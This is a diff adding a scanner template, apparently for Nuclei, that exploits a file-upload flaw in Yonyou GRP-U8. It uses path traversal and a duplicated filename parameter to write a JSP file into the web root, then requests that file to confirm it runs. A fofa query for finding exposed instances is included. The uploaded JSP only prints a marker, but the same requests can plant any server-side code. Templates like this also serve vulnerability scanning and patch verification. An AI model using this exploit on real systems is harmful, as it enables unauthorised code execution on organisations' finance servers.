@@ -1,0 +1,44 @@
+id: GRP
+info:
+  name: xxx
+  author: mike
+  severity: info
+  description: xxx
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="用友-GRP-U8"
+http:
+  - raw:
+      - |
+        POST /UploadFileData?action=upload_file&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&foldername=..%2F&filename=mikes.jsp&filename=1.jpg HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Connection: keep-alive
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: JSESSIONID=59227D2C93FE3E8C2626DA625CE710F9
+        Content-Type: multipart/form-data
+        Upgrade-Insecure-Requests: 1
+        Content-Length: 177
+
+        --ec126a48c5b7676dce1b676f5251358f
+        Content-Disposition: form-data; name="myfile"; filename="test.jpg"
+
+        <% out.println("20231101");%>
+        --ec126a48c5b7676dce1b676f5251358f--  
+      
+      - |
+        GET /R9iPortal/mikes.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate 
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "20231101"
